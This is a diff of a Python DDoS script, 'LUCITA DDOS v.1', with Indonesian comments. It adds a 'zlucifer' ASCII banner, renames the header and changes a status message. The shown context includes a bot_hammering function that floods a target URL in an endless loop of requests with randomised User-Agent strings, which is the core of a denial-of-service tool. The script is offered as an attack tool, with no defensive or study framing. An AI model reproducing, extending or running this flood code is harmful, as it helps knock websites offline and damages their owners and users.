@@ -1,7 +1,19 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
+#////                       _            _  __                              ////
+#////                      | |          (_)/ _|                             ////
+#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
+#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
+#////                   / /| | |_| | (__| | ||  __/ |                       ////
+#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
+#////                                                                       ////
+#///////////////////////////////////////////////////////////////////////////////
+#///////////////////////////////////////////////////////////////////////////////
 # Script ini recode dari 
-# python 3.3.2+ Lucita DDOS Script v.1
+# LUCITA DDOS v.1
+
 
 
 from queue import Queue
@@ -33,7 +45,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mMengunci Target...\033[0m")
+			print("\033[94mLucita luna mengelus target...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
